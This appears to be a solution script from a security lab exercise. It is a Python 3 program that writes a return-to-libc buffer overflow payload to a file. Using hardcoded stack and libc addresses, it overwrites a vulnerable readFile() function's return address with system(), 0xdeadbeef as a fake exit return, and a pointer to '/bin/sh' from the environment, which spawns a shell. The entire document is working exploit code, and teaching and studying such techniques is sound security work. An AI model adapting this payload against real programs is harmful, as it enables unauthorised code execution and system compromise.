#!/usr/bin/python3
import sys

# Initialize the content array
content = bytearray(0x90 for i in range(300))

# The address of "SHELL=/bin/sh"
env_shell_addr = 0xbffffdd5

# The address of "/bin/sh" in env. variables
binsh_addr = env_shell_addr + 6

# The address of system()
system_addr = 0xb7e42db0

# The address of exit(), in this subtask is replaced with 0xdeadbeef
exit_addr = 0xdeadbeef

# The location of the return address in memory
return_addr_location = 0xbfffeddc

# The address of buffer
buffer_addr = 0xbfffed82

# Calculate the offset between buffer address and address of return address
offset = return_addr_location - buffer_addr

# Overwrite the return address of readFile() function to system()
content[offset:offset+4] = (system_addr).to_bytes(4,byteorder='little')

# Write the argument of system() (the address of "/bin/sh")
content[offset+8:offset+12] = (binsh_addr).to_bytes(4,byteorder='little')

# Overwrite the return address of system() function to 0xdeadbeef
content[offset+4:offset+8] = (exit_addr).to_bytes(4,byteorder='little')

# Write the content to payload_sys_1
file = open("payload_sys_1", "wb")
file.write(content)
file.close()